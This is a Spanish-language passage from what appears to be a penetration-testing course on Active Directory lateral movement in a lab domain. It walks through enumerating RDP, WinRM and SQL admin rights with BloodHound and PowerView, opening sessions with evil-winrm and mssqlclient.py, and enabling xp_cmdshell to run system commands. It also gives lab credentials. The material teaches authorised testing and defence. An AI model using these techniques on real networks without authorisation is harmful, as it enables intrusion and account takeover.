Una vez que obtenemos un punto de apoyo en el dominio, nuestro objetivo cambia a avanzar nuestra posición moviéndonos lateral o verticalmente para obtener acceso a otros hosts y, eventualmente, comprometer el dominio o algún otro objetivo, dependiendo del propósito de la evaluación. Para lograr esto, hay varias formas en las que podemos movernos lateralmente. Típicamente, si tomamos el control de una cuenta con derechos de administrador local sobre un host o un conjunto de hosts, podemos realizar un ataque de `Pass-the-Hash` para autenticarnos a través del protocolo SMB.

`¿Pero qué pasa si aún no tenemos derechos de administrador local en ningún host del dominio?`

Existen varias otras formas de movernos en un dominio de Windows:

- `Remote Desktop Protocol` (`RDP`): es un protocolo de acceso/gestión remota que nos da acceso GUI a un host objetivo.
    
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2): también conocido como PSRemoting o acceso de Windows Remote Management (WinRM), es un protocolo de acceso remoto que nos permite ejecutar comandos o ingresar a una sesión de línea de comandos interactiva en un host remoto utilizando PowerShell.
    
- `MSSQL Server`: una cuenta con privilegios de sysadmin en una instancia de SQL Server puede iniciar sesión en la instancia de forma remota y ejecutar consultas contra la base de datos. Este acceso puede ser utilizado para ejecutar comandos del sistema operativo en el contexto de la cuenta del servicio SQL Server a través de varios métodos.
    

Podemos enumerar este acceso de varias maneras. La más fácil, una vez más, es a través de BloodHound, ya que existen los siguientes edges que nos muestran qué tipos de privilegios de acceso remoto tiene un usuario dado:

- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

También podemos enumerar estos privilegios utilizando herramientas como PowerView e incluso herramientas integradas.

---

## Scenario Setup

En esta sección, nos moveremos entre un host de ataque Windows y Linux mientras trabajamos en los diversos ejemplos. Puedes iniciar los hosts para esta sección al final de esta sección y RDP en el host de ataque MS01 Windows. Para la parte de esta sección que requiere interacción desde un host Linux (`mssqlclient.py` y `evil-winrm`), puedes abrir una consola de PowerShell en MS01 y hacer SSH a `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`. Recomendamos que pruebes todos los métodos mostrados en esta sección (es decir, `Enter-PSSession` y `PowerUpSQL` desde el host de ataque Windows y `evil-winrm` y `mssqlclient.py` desde el host de ataque Linux).

---

## Remote Desktop

Típicamente, si tenemos control de un usuario administrador local en una máquina dada, podremos acceder a ella a través de RDP. A veces, obtendremos un punto de apoyo con un usuario que no tiene derechos de administrador local en ningún lugar, pero sí tiene derechos para RDP en una o más máquinas. Este acceso podría ser extremadamente útil ya que podríamos usar la posición del host para:

- Lanzar ataques adicionales
- Podríamos ser capaces de escalar privilegios y obtener credenciales para un usuario con más privilegios
- Podríamos saquear el host en busca de datos o credenciales sensibles

Usando PowerView, podríamos utilizar la función [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) para comenzar a enumerar miembros del grupo `Remote Desktop Users` en un host dado. Veamos el grupo `Remote Desktop Users` en el host `MS01` en nuestro dominio objetivo.

### Enumerating the Remote Desktop Users Group

```r
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

A partir de la información anterior, podemos ver que todos los usuarios del dominio (es decir, `todos` los usuarios del dominio) pueden RDP a este host. Es común ver esto en hosts de Remote Desktop Services (RDS) o hosts utilizados como jump hosts. Este tipo de servidor podría ser muy utilizado, y podríamos encontrar datos sensibles (como credenciales) que podrían usarse para avanzar nuestro acceso, o podríamos encontrar un vector de escalamiento de privilegios que podría llevar a acceso de administrador local y robo de credenciales/toma de cuentas para un usuario con más privilegios en el dominio. Típicamente, lo primero que reviso después de importar datos de BloodHound es:

¿El grupo Domain Users tiene derechos de administrador local o derechos de ejecución (como RDP o WinRM) sobre uno o más hosts?

### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)

Si obtenemos el control sobre un usuario a través de un ataque como LLMNR/NBT-NS Response Spoofing o Kerberoasting, podemos buscar el nombre de usuario en BloodHound para verificar qué tipo de derechos de acceso remoto tienen, ya sea directamente o heredados a través de la membresía de grupo bajo `Execution Rights` en la pestaña `Node Info`.

### Checking Remote Access Rights using BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/execution_rights.png)

También podríamos verificar la pestaña `Analysis` y ejecutar las consultas preconstruidas `Find Workstations where Domain Users can RDP` o `Find Servers where Domain Users can RDP`. Hay otras formas de enumerar esta información, pero BloodHound es una herramienta poderosa que puede ayudarnos a reducir rápidamente y con precisión estos tipos de derechos de acceso, lo cual es enormemente beneficioso para nosotros como pentesters bajo limitaciones de tiempo para el período de evaluación. Esto también puede ser útil para el equipo azul para auditar periódicamente los derechos de acceso remoto en todo el entorno y detectar problemas a gran escala, como todos los usuarios del dominio teniendo acceso no intencionado a un host o auditar los derechos para usuarios/grupos específicos.

Para probar este acceso, podemos usar una herramienta como `xfreerdp` o `Remmina` desde nuestra VM o el Pwnbox o `mstsc.exe` si atacamos desde un host Windows.

---

## WinRM

Al igual que RDP, podríamos encontrar que un usuario específico o todo un grupo tiene acceso WinRM a uno o más hosts. Esto también podría ser acceso de bajo privilegio que podríamos usar para buscar datos sensibles o intentar escalar privilegios, o podría resultar en acceso de administrador local, que potencialmente podría ser utilizado para avanzar nuestro acceso. Nuevamente, podemos usar la función de PowerView `Get-NetLocalGroupMember` para el grupo `Remote Management Users`. Este grupo ha existido desde los días de Windows 8/Windows Server 2012 para habilitar el acceso WinRM sin otorgar derechos de administrador local.

### Enumerating the Remote Management Users Group

```r
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

También podemos utilizar esta consulta `Cypher` personalizada en BloodHound para buscar usuarios con este tipo de acceso. Esto se puede hacer pegando la consulta en el cuadro `Raw Query` en la parte inferior de la pantalla y presionando enter.

```r
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

### Using the Cypher Query in BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/canpsremote_bh_cypherq.png)

También podríamos agregar esto como una consulta personalizada a nuestra instalación de BloodHound, para que siempre esté disponible para nosotros.

### Adding the Cypher Query as a Custom Query in BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/user_defined_query.png)

Podemos usar el cmdlet [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) usando PowerShell desde un host Windows.

### Establishing WinRM Session from Windows

```r
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

Desde nuestro host de ataque Linux, podemos usar la herramienta [evil-winrm](https://github.com/Hackplayers/evil-winrm) para conectarnos.

Para usar `evil-winrm` podemos instalarlo usando el siguiente comando:

### Installing Evil-WinRM

```r
gem install evil-winrm
```

Escribir `evil-winrm` nos dará el menú de ayuda y todos los comandos disponibles.

### Viewing Evil-WinRM's Help Menu

```r
evil-winrm 

Evil-WinRM shell v3.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

Podemos conectarnos con solo una dirección IP y credenciales válidas.

### Connecting to a Target with Evil-WinRM and Valid Credentials

```r
evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

Desde aquí, podríamos explorar para planear nuestro próximo movimiento.

---

## SQL Server Admin

Con mayor frecuencia encontraremos servidores SQL en los entornos que enfrentamos. Es común encontrar cuentas de usuario y servicio configuradas con privilegios de sysadmin en una instancia dada de SQL Server. Podríamos obtener credenciales para una cuenta con este acceso a través de Kerberoasting (común) u otros como LLMNR/NBT-NS Response Spoofing o password spraying. Otra forma en que podríamos encontrar credenciales de servidor SQL es usando la herramienta [Snaffler](https://github.com/Snaff

Con/Snaffler) para encontrar archivos web.config u otros tipos de archivos de configuración que contengan cadenas de conexión de servidor SQL.

BloodHound, una vez más, es una gran apuesta para encontrar este tipo de acceso a través del edge `SQLAdmin`. Podemos verificar los `SQL Admin Rights` en la pestaña `Node Info` para un usuario dado o usar esta consulta `Cypher` personalizada para buscar:

```r
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Aquí vemos que un usuario, `damundsen`, tiene derechos `SQLAdmin` sobre el host `ACADEMY-EA-DB01`.

### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)

Podemos usar nuestros derechos de ACL para autenticarnos con el usuario `wley`, cambiar la contraseña para el usuario `damundsen` y luego autenticarnos con el objetivo utilizando una herramienta como `PowerUpSQL`, que tiene una útil [hoja de trucos de comandos](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Supongamos que cambiamos la contraseña de la cuenta a `SQL1234!` usando nuestros derechos de ACL. Ahora podemos autenticarnos y ejecutar comandos del sistema operativo.

Primero, busquemos instancias de servidor SQL.

### Enumerating MSSQL Instances with PowerUpSQL

```r
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

Luego podríamos autenticarnos contra el host remoto de servidor SQL y ejecutar consultas personalizadas o comandos del sistema operativo. Vale la pena experimentar con esta herramienta, pero la extensa enumeración y tácticas de ataque contra MSSQL están fuera del alcance de este módulo.

```r
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

También podemos autenticarnos desde nuestro host de ataque Linux usando [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) del toolkit Impacket.

### Displaying mssqlclient.py Options

```r
mssqlclient.py 

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

<SNIP>
```

### Running mssqlclient.py Against the Target

```r
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Una vez conectados, podríamos escribir `help` para ver qué comandos están disponibles para nosotros.

### Viewing our Options with Access to the SQL Server

```r
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Luego podríamos elegir `enable_xp_cmdshell` para habilitar el procedimiento almacenado [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) que permite ejecutar comandos del sistema operativo a través de la base de datos si la cuenta en cuestión tiene los derechos de acceso adecuados.

### Choosing enable_xp_cmdshell

```r
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Finalmente, podemos ejecutar comandos en el formato `xp_cmdshell <command>`. Aquí podemos enumerar los derechos que nuestro usuario tiene en el sistema y ver que tenemos [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), que puede ser aprovechado en combinación con una herramienta como [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), o [RoguePotato](https://github.com/antonioCoco/RoguePotato) para escalar a privilegios `SYSTEM`, dependiendo del host objetivo, y usar este acceso para continuar hacia nuestro objetivo. Estos métodos se cubren en la sección `SeImpersonate and SeAssignPrimaryToken` del módulo [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation). ¡Pruébalos en este objetivo si deseas practicar más!

### Enumerating our Rights on the System using xp_cmdshell

```r
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                               
```

---

## Moving On

Esta sección demostró algunas posibles técnicas de movimiento lateral en un entorno de Active Directory. Siempre debemos buscar estos tipos de derechos cuando obtenemos nuestro punto de apoyo inicial y tomamos control de cuentas de usuario adicionales. ¡Recuerda que enumerar y atacar es un proceso iterativo! Cada vez que tomamos control de otro usuario/host, debemos repetir algunos pasos de enumeración para ver qué nuevos derechos y privilegios hemos obtenido. Nunca pases por alto los derechos de acceso remoto si el usuario no es un administrador local en el host objetivo porque muy probablemente podríamos llegar a un host donde encontramos datos sensibles o podemos escalar privilegios.

Finalmente, cada vez que encontremos credenciales de SQL (en un script, un archivo web.config o algún otro tipo de cadena de conexión de base de datos), debemos probar el acceso contra cualquier servidor MSSQL en el entorno. Este tipo de acceso casi siempre garantiza acceso `SYSTEM` sobre un host. Si podemos ejecutar comandos como la cuenta con la que nos autenticamos, casi siempre tendrá el peligroso derecho `SeImpersonatePrivilege`.

La siguiente sección abordará un problema común que a menudo encontramos cuando usamos WinRM para conectarnos a hosts en la red.